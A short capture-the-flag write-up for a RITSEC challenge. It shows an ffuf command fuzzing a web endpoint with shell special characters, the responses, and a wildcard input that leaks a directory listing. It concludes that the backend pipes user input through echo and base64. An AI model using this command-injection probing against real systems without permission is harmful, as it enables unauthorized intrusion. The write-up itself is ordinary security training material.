1. Fuzz the special chars.

```
$ ffuf -u  'https://ctf.ritsec.club/rce?input=FUZZ' -w /opt/SecLists/Fuzzing/special-chars.txt -fs 541
~                       [Status: 200, Size: 553, Words: 208, Lines: 25]
+                       [Status: 200, Size: 537, Words: 209, Lines: 25]
>                       [Status: 200, Size: 540, Words: 208, Lines: 25]
;                       [Status: 200, Size: 537, Words: 208, Lines: 25]
*                       [Status: 200, Size: 609, Words: 208, Lines: 25]
<                       [Status: 200, Size: 540, Words: 208, Lines: 25]
`                       [Status: 200, Size: 537, Words: 208, Lines: 25]
(                       [Status: 200, Size: 537, Words: 208, Lines: 25]
#                       [Status: 200, Size: 536, Words: 208, Lines: 25]
|                       [Status: 200, Size: 537, Words: 208, Lines: 25]
)                       [Status: 200, Size: 537, Words: 208, Lines: 25]
&                       [Status: 200, Size: 536, Words: 208, Lines: 25]
```

2. Try `input=*`, the response looks like `ls` output.

```
base64('RG9ja2VyZmlsZSBkb2NrZXItY29tcG9zZS55bWwgZXpwd24ucHkgZmxhZyB0ZW1wbGF0ZXMK)
=>
Dockerfile docker-compose.yml ezpwn.py flag templates
```

3. Guess the backend should be like `echo <input> | base64`.
